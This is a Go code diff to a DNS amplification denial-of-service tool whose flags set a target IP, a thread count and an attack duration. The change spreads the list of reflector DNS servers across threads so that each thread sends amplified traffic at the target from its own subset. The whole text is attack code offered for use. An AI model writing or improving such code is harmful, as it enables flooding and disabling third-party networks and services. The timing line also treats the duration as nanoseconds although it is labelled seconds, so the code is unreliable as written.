@@ -17,13 +17,14 @@ var duration = flag.Int("duration", 1, "The duration of the attack in seconds")
 func main() {
     flag.Parse()
     target := net.ParseIP(*targetIP)
-
-    servers := dnsamp.ReadFile(*filename)
-
+    allServers := dnsamp.ReadFile(*filename)
+    servers := make([][]dnsamp.Target, *numThreads)
+    for i, server := range allServers {
+        servers[i%*numThreads] = append(servers[i%*numThreads], server)
+    }
     // Start threads
     for i:=0; i<*numThreads; i++ {
-        // TODO: slice servers per thread
-        dnsamp.Send(target, servers)
+        dnsamp.Send(target, servers[i])
     }
     // Wait for duration in seconds, then stop attack
     time.Sleep(time.Duration(*duration))
